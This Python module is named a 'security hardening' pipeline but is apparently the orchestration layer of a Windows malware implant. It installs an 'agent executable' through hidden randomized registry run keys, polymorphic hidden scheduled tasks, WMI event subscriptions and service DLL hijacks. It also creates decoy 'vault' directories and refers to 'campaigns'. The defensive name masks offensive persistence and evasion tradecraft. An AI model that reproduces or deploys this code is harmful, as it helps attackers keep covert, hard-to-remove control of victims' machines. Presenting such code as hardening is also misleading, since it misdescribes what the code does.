"""
Security Hardening Integration Module
Comprehensive integration of all Priority 1 & Priority 2 security features
"""

import os
import logging
from typing import Optional, Dict
import json

# Import all hardening modules
from vault_randomization import VaultRandomizationEngine, DecoyVaultHoneypot
from persistence_hardening import (
    RegistryRandomizer, PolymorphicTaskScheduler, 
    WMIEventSubscription, PersistenceManager
)
from service_hijacking import ServiceDLLScanner, DLLHijackingPayload

logger = logging.getLogger('SecurityHardeningIntegration')


class SecurityHardeningPipeline:
    """
    Unified security hardening pipeline that deploys all Priority 1 & 2 features.
    
    PRIORITY 1 (IMMEDIATE):
    1. Randomize vault directory names with seed-based recovery
    2. Add decoy vault instances (honeypot pattern)
    3. Implement registry value randomization for agent persistence
    
    PRIORITY 2 (STRATEGIC):
    1. Implement scheduled task polymorphism
    2. Add service DLL hijacking capabilities
    3. Implement WMI event subscription for alternative persistence
    """
    
    def __init__(self, seed: Optional[str] = None, deployment_id: Optional[str] = None):
        """
        Initialize security hardening pipeline.
        
        Args:
            seed: Optional seed for reproducible hardening (useful for campaigns)
            deployment_id: Optional deployment identifier (used in vault/task names)
        """
        self.seed = seed
        self.deployment_id = deployment_id or "default"
        self.deployment_log = {
            "deployment_id": self.deployment_id,
            "timestamp": str(__import__('datetime').datetime.now().isoformat()),
            "components": {}
        }
    
    def deploy_priority_1_vault_randomization(self) -> Dict[str, any]:
        """
        PRIORITY 1: Deploy randomized vault directory with recovery mechanism.
        
        Returns:
            Deployment results dictionary
        """
        results = {
            "status": "pending",
            "vault_path": None,
            "recovery_info": None,
            "decoy_vaults": 0,
            "errors": []
        }
        
        try:
            logger.info("=== PRIORITY 1: Vault Randomization ===")
            
            # Generate randomized vault path
            vault_path = VaultRandomizationEngine.get_randomized_vault_path(self.seed)
            results["vault_path"] = vault_path
            
            # Create vault directory structure
            os.makedirs(vault_path, mode=0o700, exist_ok=True)
            logger.info(f"Created randomized vault at: {vault_path}")
            
            # Store recovery information
            recovery_info = VaultRandomizationEngine.store_vault_recovery_info(vault_path)
            results["recovery_info"] = recovery_info
            logger.info(f"Stored recovery info: {recovery_info}")
            
            # Create decoy vault instances
            decoys_created = DecoyVaultHoneypot.create_all_decoy_vaults()
            results["decoy_vaults"] = decoys_created
            logger.info(f"Created {decoys_created} decoy vault instances")
            
            results["status"] = "success"
            
        except Exception as e:
            results["status"] = "failed"
            results["errors"].append(str(e))
            logger.error(f"Vault randomization failed: {e}")
        
        self.deployment_log["components"]["vault_randomization"] = results
        return results
    
    def deploy_priority_1_registry_randomization(self, agent_executable: str) -> Dict[str, any]:
        """
        PRIORITY 1: Deploy registry randomization for agent persistence.
        
        Args:
            agent_executable: Path to agent executable
        
        Returns:
            Deployment results dictionary
        """
        results = {
            "status": "pending",
            "registry_entries": [],
            "errors": []
        }
        
        try:
            logger.info("=== PRIORITY 1: Registry Randomization ===")
            
            # Create multiple randomized registry entries for redundancy
            registry_locations = []
            for i in range(3):  # Create 3 redundant entries
                reg_entry = RegistryRandomizer.create_randomized_registry_entry(
                    agent_executable,
                    seed=f"{self.seed}_{i}" if self.seed else None
                )
                registry_locations.append(reg_entry)
                logger.info(f"Registry entry {i+1}: {reg_entry['registry_path']} = {reg_entry['value_name']}")
            
            results["registry_entries"] = registry_locations
            results["status"] = "success"
            
        except Exception as e:
            results["status"] = "failed"
            results["errors"].append(str(e))
            logger.error(f"Registry randomization failed: {e}")
        
        self.deployment_log["components"]["registry_randomization"] = results
        return results
    
    def deploy_priority_2_polymorphic_tasks(self, agent_executable: str) -> Dict[str, any]:
        """
        PRIORITY 2: Deploy polymorphic scheduled task persistence.
        
        Args:
            agent_executable: Path to agent executable
        
        Returns:
            Deployment results dictionary
        """
        results = {
            "status": "pending",
            "tasks": [],
            "errors": []
        }
        
        try:
            logger.info("=== PRIORITY 2: Polymorphic Scheduled Tasks ===")
            
            # Create multiple polymorphic tasks with different triggers
            trigger_types = ["AtLogon", "AtStartup", "AtScheduledTime"]
            
            for trigger in trigger_types:
                try:
                    task_config = PolymorphicTaskScheduler.create_polymorphic_task(
                        agent_executable,
                        trigger_type=trigger,
                        hidden=True
                    )
                    results["tasks"].append(task_config)
                    logger.info(f"Created {trigger} task: {task_config['task_name']}")
                except Exception as e:
                    results["errors"].append(f"Failed to create {trigger} task: {e}")
                    logger.error(f"Task creation failed for {trigger}: {e}")
            
            results["status"] = "success" if results["tasks"] else "partial"
            
        except Exception as e:
            results["status"] = "failed"
            results["errors"].append(str(e))
            logger.error(f"Polymorphic task deployment failed: {e}")
        
        self.deployment_log["components"]["polymorphic_tasks"] = results
        return results
    
    def deploy_priority_2_wmi_subscription(self, agent_executable: str) -> Dict[str, any]:
        """
        PRIORITY 2: Deploy WMI event subscription persistence.
        
        Args:
            agent_executable: Path to agent executable
        
        Returns:
            Deployment results dictionary
        """
        results = {
            "status": "pending",
            "subscriptions": [],
            "errors": []
        }
        
        try:
            logger.info("=== PRIORITY 2: WMI Event Subscription ===")
            
            # Create multiple WMI subscriptions for different events
            event_filters = ["startup", "logon", "time-interval"]
            
            for event_filter in event_filters:
                try:
                    subscription = WMIEventSubscription.create_wmi_event_subscription(
                        agent_executable,
                        event_filter=event_filter
                    )
                    results["subscriptions"].append(subscription)
                    logger.info(f"Created WMI subscription for {event_filter}")
                except Exception as e:
                    results["errors"].append(f"Failed to create {event_filter} subscription: {e}")
                    logger.error(f"WMI subscription failed for {event_filter}: {e}")
            
            results["status"] = "success" if results["subscriptions"] else "partial"
            
        except Exception as e:
            results["status"] = "failed"
            results["errors"].append(str(e))
            logger.error(f"WMI subscription deployment failed: {e}")
        
        self.deployment_log["components"]["wmi_subscriptions"] = results
        return results
    
    def deploy_priority_2_service_hijacking(self) -> Dict[str, any]:
        """
        PRIORITY 2: Scan for and create DLL hijacking opportunities.
        
        Returns:
            Deployment results dictionary
        """
        results = {
            "status": "pending",
            "vulnerable_services": [],
            "deployed_hijacks": 0,
            "errors": []
        }
        
        try:
            logger.info("=== PRIORITY 2: Service DLL Hijacking ===")
            
            # Scan for hijacking opportunities
            vulnerable = ServiceDLLScanner.scan_all_services_for_hijacking()
            results["vulnerable_services"] = vulnerable
            logger.info(f"Found {len(vulnerable)} vulnerable services")
            
            # Deploy hijacks on first few services
            for service_info in vulnerable[:2]:  # Limit to first 2
                try:
                    for dll_name, _ in service_info["missing_dlls"]:
                        success = DLLHijackingPayload.create_hijacking_opportunity(
                            service_info["service_name"],
                            dll_name
                        )
                        if success:
                            results["deployed_hijacks"] += 1
                            logger.info(f"Deployed hijack for {service_info['service_name']}: {dll_name}")
                except Exception as e:
                    results["errors"].append(f"Failed to hijack {service_info['service_name']}: {e}")
            
            results["status"] = "success" if results["deployed_hijacks"] > 0 else "partial"
            
        except Exception as e:
            results["status"] = "failed"
            results["errors"].append(str(e))
            logger.error(f"Service hijacking deployment failed: {e}")
        
        self.deployment_log["components"]["service_hijacking"] = results
        return results
    
    def deploy_full_security_hardening(self, agent_executable: str, 
                                       vault_only: bool = False,
                                       priority_2_only: bool = False) -> Dict[str, any]:
        """
        Deploy full security hardening pipeline.
        
        Args:
            agent_executable: Path to agent executable
            vault_only: If True, deploy only vault randomization (Priority 1)
            priority_2_only: If True, deploy only Priority 2 features
        
        Returns:
            Complete deployment results
        """
        logger.info("=" * 60)
        logger.info("STARTING SECURITY HARDENING PIPELINE")
        logger.info("=" * 60)
        logger.info(f"Deployment ID: {self.deployment_id}")
        logger.info(f"Seed: {self.seed or 'auto-generated'}")
        
        # PRIORITY 1: Always deploy unless priority_2_only
        if not priority_2_only:
            logger.info("\n--- PRIORITY 1 DEPLOYMENTS ---")
            self.deploy_priority_1_vault_randomization()
            self.deploy_priority_1_registry_randomization(agent_executable)
        
        # PRIORITY 2: Deploy unless vault_only
        if not vault_only:
            logger.info("\n--- PRIORITY 2 DEPLOYMENTS ---")
            self.deploy_priority_2_polymorphic_tasks(agent_executable)
            self.deploy_priority_2_wmi_subscription(agent_executable)
            self.deploy_priority_2_service_hijacking()
        
        # Generate deployment report
        self.deployment_log["deployment_status"] = "completed"
        
        logger.info("\n" + "=" * 60)
        logger.info("SECURITY HARDENING PIPELINE COMPLETED")
        logger.info("=" * 60)
        logger.info(json.dumps(self.deployment_log, indent=2))
        
        return self.deployment_log
    
    def save_deployment_report(self, report_path: Optional[str] = None) -> str:
        """
        Save deployment report to file.
        
        Args:
            report_path: Optional custom report path
        
        Returns:
            Path to saved report
        """
        report_path = report_path or os.path.expanduser(f"~/.{self.deployment_id}_hardening_report.json")
        
        try:
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
            with open(report_path, 'w') as f:
                json.dump(self.deployment_log, f, indent=2)
            os.chmod(report_path, 0o600)
            logger.info(f"Saved deployment report to: {report_path}")
            return report_path
        except Exception as e:
            logger.error(f"Failed to save deployment report: {e}")
            return ""


# Convenience functions
def apply_priority_1_hardening(agent_executable: str, seed: Optional[str] = None) -> Dict[str, any]:
    """
    Quick deployment of Priority 1 features only.
    
    Args:
        agent_executable: Path to agent executable
        seed: Optional seed for reproducible hardening
    
    Returns:
        Deployment results
    """
    pipeline = SecurityHardeningPipeline(seed=seed)
    return pipeline.deploy_full_security_hardening(
        agent_executable,
        vault_only=True
    )


def apply_priority_2_hardening(agent_executable: str, seed: Optional[str] = None) -> Dict[str, any]:
    """
    Quick deployment of Priority 2 features only.
    
    Args:
        agent_executable: Path to agent executable
        seed: Optional seed for reproducible hardening
    
    Returns:
        Deployment results
    """
    pipeline = SecurityHardeningPipeline(seed=seed)
    return pipeline.deploy_full_security_hardening(
        agent_executable,
        priority_2_only=True
    )


def apply_full_hardening(agent_executable: str, seed: Optional[str] = None,
                         deployment_id: Optional[str] = None) -> Dict[str, any]:
    """
    Full deployment of all Priority 1 & 2 features.
    
    Args:
        agent_executable: Path to agent executable
        seed: Optional seed for reproducible hardening
        deployment_id: Optional deployment identifier
    
    Returns:
        Complete deployment results
    """
    pipeline = SecurityHardeningPipeline(seed=seed, deployment_id=deployment_id)
    return pipeline.deploy_full_security_hardening(agent_executable)


if __name__ == "__main__":
    # Example usage
    import sys
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(name)s] %(message)s'
    )
    
    if len(sys.argv) > 1:
        agent_path = sys.argv[1]
        deployment_type = sys.argv[2] if len(sys.argv) > 2 else "full"
        
        if deployment_type == "priority1":
            results = apply_priority_1_hardening(agent_path, seed="initial_deployment")
        elif deployment_type == "priority2":
            results = apply_priority_2_hardening(agent_path, seed="strategic_deployment")
        else:
            results = apply_full_hardening(agent_path, seed="comprehensive", deployment_id="campaign_001")
        
        print("\nDeployment Results:")
        print(json.dumps(results, indent=2))
    else:
        print("Usage: python security_hardening_integration.py <agent_executable> [priority1|priority2|full]")
